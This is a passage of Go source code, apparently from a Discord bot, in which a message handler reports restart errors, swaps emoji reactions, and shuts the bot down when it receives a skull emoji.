			s.ChannelMessageSendReply(m.ChannelID, "Restart failed: "+err.Error(), m.Reference())
		}
	} else if m.Content == "💀" {
		flag = 2
	}

done:
	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
	if flag > 0 {
		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
		if flag > 1 {
			s.Close()
			os.Exit(0)
		}
	}
}
